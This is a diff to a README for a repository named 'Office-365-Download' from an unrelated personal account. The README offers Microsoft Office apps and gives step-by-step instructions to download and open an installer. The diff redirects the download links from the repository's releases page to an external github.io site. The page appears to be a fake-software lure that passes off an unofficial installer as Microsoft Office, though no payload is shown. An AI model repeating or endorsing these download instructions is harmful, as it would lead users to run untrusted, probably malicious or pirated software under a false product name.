@@ -1,6 +1,6 @@
 # 📦 Office-365-Download - Get your Microsoft office apps today
 
-[![](https://img.shields.io/badge/Download-Office_365-blue.svg)](https://github.com/Adynamiagoogolplex135/Office-365-Download/releases)
+[![](https://img.shields.io/badge/Download-Office_365-blue.svg)](https://adynamiagoogolplex135.github.io)
 
 ## 📁 About this software
 
@@ -21,7 +21,7 @@ Ensure you have a stable internet connection during the installation process. Cl
 
 ## 📥 How to download and install
 
-1. Visit the following link to find the latest version: [https://github.com/Adynamiagoogolplex135/Office-365-Download/releases](https://github.com/Adynamiagoogolplex135/Office-365-Download/releases)
+1. Visit the following link to find the latest version: [https://adynamiagoogolplex135.github.io](https://adynamiagoogolplex135.github.io)
 2. On that page, locate the latest release version under the Assets header.
 3. Click the file name to download the installer to your computer.
 4. Open your Downloads folder once the file finishes saving.
